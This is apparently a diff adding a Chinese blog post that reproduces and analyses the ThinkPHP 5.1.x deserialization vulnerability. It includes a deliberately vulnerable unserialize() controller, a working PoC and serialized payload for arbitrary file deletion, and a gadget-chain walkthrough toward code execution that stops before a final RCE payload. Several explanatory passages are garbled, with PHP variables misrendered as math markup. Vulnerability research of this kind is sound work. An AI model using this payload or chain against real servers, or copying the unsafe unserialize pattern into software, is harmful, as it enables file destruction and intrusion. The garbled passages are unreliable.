@@ -1,0 +1,660 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>thinkphp5.1.x反序列化漏洞复现与分析 | 6right</title>
+
+<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    thinkphp5.1.x反序列化漏洞复现与分析
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-03-02 ·
+                    </time>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/pe3-Tsqw7/" class="post-tags">
+                            # 漏洞分析
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="thinkphp51x反序列化漏洞复现与分析">thinkphp5.1.x反序列化漏洞复现与分析</h1>
+<h2 id="环境搭建">环境搭建</h2>
+<p>安装compoer</p>
+<pre><code>https://install.phpcomposer.com/composer.phar
+</code></pre>
+<p>放在php目录下，在 PHP 安装目录下新建一个 <code>composer.bat</code> 文件，并将下列代码保存到此文件中</p>
+<pre><code>@php &quot;%~dp0composer.phar&quot; %*
+</code></pre>
+<p>进入web根目录进行安装</p>
+<pre><code>composer create-project topthink/think=5.1.35 tp5.1
+</code></pre>
+<p>访问</p>
+<pre><code>http://localhost/tp5.1/public/
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/1199b2b16d6c4dc2bd2ffe75b07ee0fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<h2 id="构建反序列化入口">构建反序列化入口</h2>
+<p><strong>需要编写一个控制器模块并存在反序列化可控点，这样才能进行利用</strong></p>
+<pre><code>tp5.1\application\index\controller\Index.php
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/a91b20775e7f4c9bbcbc0b9c3a240e99.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<pre><code> public function unser(){
+        $tmp = $_POST['test'];
+        echo $tmp;
+        unserialize(($tmp));
+    }
+</code></pre>
+<p>访问thinkphp路由</p>
+<pre><code>http://localhost/tp5.1/public/index.php/index/index/unser
+</code></pre>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p><strong>漏洞的起点在</strong> <code>/thinkphp/library/think/process/pipes/Windows.php</code><strong>的</strong> <code>__destruct()</code></p>
+<p>__destruct析构函数一般用于在对象销毁前的清理任务</p>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/27185d37c5af45289bc95d209568efa1.png" alt="" loading="lazy"></figure>
+<p>根据路径名和函数名也能看出这是windows下的文件相关引起的漏洞</p>
+<p><code>close()</code><strong>无法利用，跟进下</strong> <code>removeFiles()</code><strong>函数</strong></p>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/5591001d4b0c41f08d3e20d47d4f0f93.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>这里遍历了</strong> <code>files</code><strong>，判断文件是否存在，如果存在就进行删除文件参数，并且这里</strong> <code>files</code><strong>可控，所以存在一个任意文件删除漏洞</strong></p>
+<p><strong>简单编写poc，更加清晰的展示出来。</strong></p>
+<pre><code class="language-php">&lt;?php
+
+namespace think\process\pipes;
+class Windows
+{
+    private $files = [];
+    #构造函数更改$files
+    public function __construct()
+    {
+        $this-&gt;files = [&quot;C:\\Users\\jin\\Desktop\\1.txt&quot;];
+    }
+
+}
+echo urlencode(serialize(new Windows()));
+#这里可以看出namespace也需要带入
+</code></pre>
+<p>访问得到结果</p>
+<pre><code>O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A26%3A%22C%3A%5CUsers%5Cjin%5CDesktop%5C1.txt%22%3B%7D%7D
+</code></pre>
+<p><strong>利用我们刚刚在index控制器中创建的反序列化点，传入我们的payload，会发现创建的</strong> <code>1.txt</code><strong>文件已经被删除了。</strong></p>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/d22df383b09b4d94a55e4b313071cfef.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>任意文件删除是一个小漏洞，命令执行才是我们关注的点</strong></p>
+<p><strong>在</strong> <code>removeFiles()</code><strong>函数中</strong> <code>file_exists</code><strong>会进行传入参数当作字符串进行处理</strong></p>
+<p><strong>但是这里如果我们传入的参数是一个对象，那么就会调用对象的</strong> <code>__toString</code><strong>魔术方法，且files值我们可控</strong></p>
+<p><strong>但是在</strong> <code>Windows</code><strong>类中并没有</strong> <code>__toString</code><strong>魔术方法</strong></p>
+<p><strong>全局搜索下，这里我们选择了</strong> <code>thinkphp/library/think/model/concern/Conversion.php</code><strong>中的</strong> <code>__toString</code><strong>魔术方法</strong></p>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/48c4283474bc4c15a3426e0d79e21150.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>跟进下</strong> <code>toJson</code><strong>方法</strong></p>
+<figure data-type="image" tabindex="7"><img src="https://img-blog.csdnimg.cn/c2126c3f6b9f46cfb68e61b8877a338d.png" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>继续跟进<code>toArray</code>方法</strong></p>
+<pre><code class="language-php">public function toArray()
+    {
+        $item       = [];
+        $hasVisible = false;
+
+        foreach ($this-&gt;visible as $key =&gt; $val) {
+            if (is_string($val)) {
+                if (strpos($val, '.')) {
+                    list($relation, $name)      = explode('.', $val);
+                    $this-&gt;visible[$relation][] = $name;
+                } else {
+                    $this-&gt;visible[$val] = true;
+                    $hasVisible          = true;
+                }
+                unset($this-&gt;visible[$key]);
+            }
+        }
+
+        foreach ($this-&gt;hidden as $key =&gt; $val) {
+            if (is_string($val)) {
+                if (strpos($val, '.')) {
+                    list($relation, $name)     = explode('.', $val);
+                    $this-&gt;hidden[$relation][] = $name;
+                } else {
+                    $this-&gt;hidden[$val] = true;
+                }
+                unset($this-&gt;hidden[$key]);
+            }
+        }
+
+        // 合并关联数据
+        $data = array_merge($this-&gt;data, $this-&gt;relation);
+
+        foreach ($data as $key =&gt; $val) {
+            if ($val instanceof Model || $val instanceof ModelCollection) {
+                // 关联模型对象
+                if (isset($this-&gt;visible[$key]) &amp;&amp; is_array($this-&gt;visible[$key])) {
+                    $val-&gt;visible($this-&gt;visible[$key]);
+                } elseif (isset($this-&gt;hidden[$key]) &amp;&amp; is_array($this-&gt;hidden[$key])) {
+                    $val-&gt;hidden($this-&gt;hidden[$key]);
+                }
+                // 关联模型对象
+                if (!isset($this-&gt;hidden[$key]) || true !== $this-&gt;hidden[$key]) {
+                    $item[$key] = $val-&gt;toArray();
+                }
+            } elseif (isset($this-&gt;visible[$key])) {
+                $item[$key] = $this-&gt;getAttr($key);
+            } elseif (!isset($this-&gt;hidden[$key]) &amp;&amp; !$hasVisible) {
+                $item[$key] = $this-&gt;getAttr($key);
+            }
+        }
+
+        // 追加属性（必须定义获取器）
+        if (!empty($this-&gt;append)) {
+            foreach ($this-&gt;append as $key =&gt; $name) {
+                if (is_array($name)) {
+                    // 追加关联对象属性
+                    $relation = $this-&gt;getRelation($key);
+
+                    if (!$relation) {
+                        $relation = $this-&gt;getAttr($key);
+                        if ($relation) {
+                            $relation-&gt;visible($name);
+                        }
+                    }
+
+                    $item[$key] = $relation ? $relation-&gt;append($name)-&gt;toArray() : [];
+                } elseif (strpos($name, '.')) {
+                    list($key, $attr) = explode('.', $name);
+                    // 追加关联对象属性
+                    $relation = $this-&gt;getRelation($key);
+
+                    if (!$relation) {
+                        $relation = $this-&gt;getAttr($key);
+                        if ($relation) {
+                            $relation-&gt;visible([$attr]);
+                        }
+                    }
+
+                    $item[$key] = $relation ? $relation-&gt;append([$attr])-&gt;toArray() : [];
+                } else {
+                    $item[$name] = $this-&gt;getAttr($name, $item);
+                }
+            }
+        }
+
+        return $item;
+    }
+</code></pre>
+<p>最关键的地方就是看到了<code>$relation-&gt;visible($name);</code>如果是可控变量-&gt;方法名(可控变量)，这里的方法名无所谓因为可以用__call去执行，所以就可以想办法去寻找存在的可利用的方法或者__call。</p>
+<p><strong>这里</strong> <code>$this-&gt;append</code><strong>可控，同时</strong> <code>$relation</code><strong>会被</strong> <code>getRelation($key)</code><strong>所控制，</strong><code>$relation-&gt;visible($name)</code><strong>是可能会被我们所控制的</strong></p>
+<p><strong>验证这个猜想，我们继续跟进下</strong> <code>getRelation</code><strong>函数</strong></p>
+<figure data-type="image" tabindex="8"><img src="https://img-blog.csdnimg.cn/5c05cdc6386b4508adc9dd0d0c002303.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>第一层</strong> <code>$relation</code><strong>要为null，代码才会继续往下执行，所以</strong> <code>getRelation</code><strong>需要直接返回null</strong></p>
+<pre><code class="language-php">if (!$relation) {
+	$relation = $this-&gt;getAttr($key);
+	if ($relation) {
+		$relation-&gt;visible([$attr]);
+	}
+}
+</code></pre>
+<p><strong>然后继续跟进</strong> <code>getAttr</code><strong>方法</strong></p>
+<figure data-type="image" tabindex="9"><img src="https://img-blog.csdnimg.cn/490fa202904d4d5d88f06894d0c3d6a3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>继续跟进</strong> <code>getData</code><strong>方法</strong></p>
+<figure data-type="image" tabindex="10"><img src="https://img-blog.csdnimg.cn/42bdf5d17ef249b58059877e40c244bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>到这里可以总结一下</p>
+<ul>
+<li>$this-&gt;append 可控</li>
+<li>$this-&gt;data 可控</li>
+<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mi>e</mi><mi>y</mi><mi mathvariant="normal">是</mi></mrow><annotation encoding="application/x-tex">key是</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord cjk_fallback">是</span></span></span></span>this-&gt;append的键名</li>
+<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">relation=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>this-&gt;getAttr(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mi>e</mi><mi>y</mi><mo>)</mo><mo>=</mo></mrow><annotation encoding="application/x-tex">key)=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>this-&gt;data(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>)</mo><mo>=</mo></mrow><annotation encoding="application/x-tex">name)=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>this-&gt;data[$key]</li>
+<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>l</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>o</mi><mi>n</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">relation=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>this-&gt;data[$key]</li>
+</ul>
+<p><strong>回到</strong> <code>toArray</code><strong>方法，整个流程就是这样的</strong></p>
+<figure data-type="image" tabindex="11"><img src="https://img-blog.csdnimg.cn/5bef50600ece46c695897e1476dca0ac.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>当我们</strong> <code>$relation</code><strong>为一个对象时，就可以进行调用类中的</strong> <code>visible</code><strong>方法且传参可控，但是需要注意</strong></p>
+<pre><code>_toString()    trait Conversion类
+ toArray()       trait Conversion类
+ getRelation()   trait Attribute类
+ getAttr()       trait Attribute类
+</code></pre>
+<blockquote>
+<p><strong>自 PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 trait。通过在类中使用use 关键字，声明要组合的Trait名称。所以，这里类的继承要使用use关键字。</strong></p>
+</blockquote>
+<p><strong>为了让前面</strong> <code>__toString</code><strong>魔术方法的对象能够同时继承Attribute类和Conversion类。我们需要寻找一个子类，经过寻找，我们找到了</strong> <code>Model</code><strong>类，但是是个抽象类，抽象类不能直接实例化。</strong></p>
+<figure data-type="image" tabindex="12"><img src="https://img-blog.csdnimg.cn/316f84e0e41d4b29959683755370d9a9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>全局搜索后，选择了</strong> <code>Pivot</code><strong>继承了</strong> <code>Model</code><strong>类</strong></p>
+<figure data-type="image" tabindex="13"><img src="https://img-blog.csdnimg.cn/ab764911032f4705b9821c72583af248.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p><strong>全局搜索</strong> <code>visible</code><strong>方法后，发现都无法利用</strong></p>
+<p>现在还缺少一个代码执行可导致RCE的点，需要满足一下条件<br>
+1.该类中没有<code>visible</code>方法<br>
+2.类中实现了<code>__call</code>方法</p>
+<p><strong>我们可以考虑</strong> <code>__call()</code><strong>魔术方法，而且</strong> <code>__call</code><strong>一般会存在</strong> <code>__call_user_func</code><strong>和</strong> <code>__call_user_func_array</code><strong>，php代码执行的终点经常选择这里。</strong></p>
+<p>但是 <code>public function __call($method, $args)</code> 我们只能控制 <code>$args</code>,所以很多类都不可以用</p>
+<p>__call()：在对象中调用一个不可访问方法时调用</p>
+<p><strong>经过寻找，Request类的</strong> <code>__call()</code><strong>方法可以使用</strong><br>
+<img src="https://img-blog.csdnimg.cn/47b1fb4feae04d39abddb23d24c7f3ae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></p>
+<p><strong>但是这里并不能直接利用达到命令执行，这里</strong> <code>$method</code>**是visible，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>r</mi><mi>g</mi><mi>s</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">之</mi><mi mathvariant="normal">前</mi><mi mathvariant="normal">的</mi><mo>∗</mo><mo>∗</mo><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">args是之前的**`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">前</span><span class="mord cjk_fallback">的</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord">‘</span></span></span></span>name <code>**可控，但是有这行代码：**</code>array_unshift($args, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>)</mo><mo separator="true">;</mo><mi mathvariant="normal">‘</mi><mo>∗</mo><mo>∗</mo><mi mathvariant="normal">会</mi><mi mathvariant="normal">将</mi><mo>∗</mo><mo>∗</mo><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">this);`**会将**`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mclose">)</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">‘</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">将</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord">‘</span></span></span></span>this<code>**插到**</code><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>r</mi><mi>g</mi><mi>s</mi><mi mathvariant="normal">‘</mi><mo>∗</mo><mo>∗</mo><mi mathvariant="normal">前</mi><mi mathvariant="normal">面</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">使</mi><mi mathvariant="normal">得</mi><mi mathvariant="normal">构</mi><mi mathvariant="normal">造</mi><mi mathvariant="normal">的</mi><mo>∗</mo><mo>∗</mo><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">args `**前面，使得构造的**`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">s</span><span class="mord">‘</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord cjk_fallback">前</span><span class="mord cjk_fallback">面</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">构</span><span class="mord cjk_fallback">造</span><span class="mord cjk_fallback">的</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord">‘</span></span></span></span>method<code>**执行的参数不可控，**</code><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>h</mi><mi>o</mi><mi>o</mi><mi>k</mi><mo>[</mo></mrow><annotation encoding="application/x-tex">this-&gt;hook[</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mopen">[</span></span></span></span>method]<code>**是我们能控制的，我们可以构造一个hook数组**</code><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>h</mi><mi>o</mi><mi>o</mi><mi>k</mi><mo>=</mo><mo>[</mo><mi mathvariant="normal">&quot;</mi><mi>v</mi><mi>i</mi><mi>s</mi><mi>i</mi><mi>b</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">&quot;</mi><mo>=</mo><mo>&gt;</mo><mi mathvariant="normal">&quot;</mi><mi mathvariant="normal">任</mi><mi mathvariant="normal">意</mi><mi mathvariant="normal">方</mi><mi mathvariant="normal">法</mi><mi mathvariant="normal">&quot;</mi><mo>]</mo><mi mathvariant="normal">‘</mi><mo>∗</mo><mo>∗</mo><mi mathvariant="normal">，</mi><mi mathvariant="normal">想</mi><mi mathvariant="normal">办</mi><mi mathvariant="normal">法</mi><mi mathvariant="normal">控</mi><mi mathvariant="normal">制</mi><mo>∗</mo><mo>∗</mo><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">hook=[&quot;visible&quot;=&gt;&quot;任意方法&quot;]`**，想办法控制**`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">h</span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">&quot;</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord mathdefault">i</span><span class="mord mathdefault">b</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">&quot;</span><span class="mord cjk_fallback">任</span><span class="mord cjk_fallback">意</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">法</span><span class="mord">&quot;</span><span class="mclose">]</span><span class="mord">‘</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">想</span><span class="mord cjk_fallback">办</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">控</span><span class="mord cjk_fallback">制</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">∗</span><span class="mord">‘</span></span></span></span>args<code>就可以控制</code>call_user_func_array`</p>
+<pre><code>call_user_func_array([$obj,&quot;任意方法&quot;],[$this,任意参数])
+ //也就是这样，是很难进行命令执行的
+ $obj-&gt;$func($this,$argv)
+</code></pre>
+<blockquote>
+<p><strong>Thinkphp作为一个web框架，Request类中有一个特殊的功能就是过滤器 filter(ThinkPHP的多个远程代码执行都是出自此处)所以可以尝试覆盖filter的方法去执行代码</strong></p>
+</blockquote>
+<p><strong>我们找到Request类中的</strong> <code>filterValue</code><strong>函数，但是</strong> <code>value</code><strong>是形参不可控，如果我们直接在__call方法中直接调用</strong> <code>filterValue()</code><strong>，那么现在</strong> <code>$value</code><strong>的值始终是</strong> <code>[$this,xxx,xxx]</code><strong>形式的，导致我们无法实现RCE</strong></p>
+<figure data-type="image" tabindex="14"><img src="https://img-blog.csdnimg.cn/db6a66b89abe46fdb80bba984a500fed.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></figure>
+<p>该方法调用了call_user_func函数，但<code>$value</code>参数不可控，如果能找到一个<code>$value</code>可控的点就好了。<br>
